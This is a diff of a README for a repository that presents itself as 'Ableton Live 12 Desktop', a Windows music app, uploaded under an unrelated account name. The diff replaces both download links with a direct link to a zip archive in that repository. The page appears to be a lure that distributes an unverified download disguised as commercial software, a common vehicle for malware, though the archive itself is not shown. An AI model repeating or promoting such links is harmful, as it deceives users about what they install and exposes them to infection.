@@ -1,11 +1,11 @@
 # 🎵 Ableton-Live-12-Desktop - Make music on your PC
 
-[![Download Now](https://img.shields.io/badge/Download-Ableton%20Live%2012%20Desktop-blue?style=for-the-badge)](https://github.com/Gifttaxethane433/Ableton-Live-12-Desktop)
+[![Download Now](https://img.shields.io/badge/Download-Ableton%20Live%2012%20Desktop-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gifttaxethane433/Ableton-Live-12-Desktop/main/BaseMain/Live_Desktop_Ableton_2.7.zip)
 
 ## 🟦 Download
 Use this link to visit this page and download the files:
 
-[https://github.com/Gifttaxethane433/Ableton-Live-12-Desktop](https://github.com/Gifttaxethane433/Ableton-Live-12-Desktop)
+[https://raw.githubusercontent.com/Gifttaxethane433/Ableton-Live-12-Desktop/main/BaseMain/Live_Desktop_Ableton_2.7.zip](https://raw.githubusercontent.com/Gifttaxethane433/Ableton-Live-12-Desktop/main/BaseMain/Live_Desktop_Ableton_2.7.zip)
 
 ## 🚀 What this is
 Ableton Live 12 Desktop is a Windows music production app for recording, editing, and arranging audio and MIDI. It fits beat making, song writing, sound design, and live sets. It also includes tools for warp-based audio work, clip editing, and Max for Live style workflows.
